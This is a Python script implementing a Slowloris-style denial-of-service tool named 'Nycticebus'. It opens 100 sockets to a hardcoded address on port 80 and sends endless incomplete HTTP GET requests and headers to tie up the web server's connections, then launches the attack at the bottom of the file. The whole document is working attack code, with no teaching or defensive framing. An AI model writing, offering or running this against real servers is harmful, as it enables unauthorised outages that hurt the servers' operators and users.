

import socket, random, time, sys

class Nycticebus:

    HEADERS = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-us;en;q=0.5",
        "Connection: keep-alive",
        "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0"
    ]

    def __init__(self, target_ip, target_port):
        self.__target_ip = target_ip
        self.__target_port = target_port

    def attack(self):
        """attack the target using incomplete GET requests"""
        sockets = self.__createSockets()

        while True:
            try:
                for s in sockets:
                    try:
                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    
                        for header in self.HEADERS:
                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except socket.error:
                        pass #log errors here
            except(KeyboardInterrupt, SystemExit):
                break

    def __createSockets(self):
        """returns a list() of sockets"""
        sockets = []
        for i in range(100):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.__target_ip, self.__target_port))
                        
            except socket.error:
                pass #log errors here

            sockets.append(s)
        
        return sockets


sl = Nycticebus("10.0.1.250", 80)
sl.attack()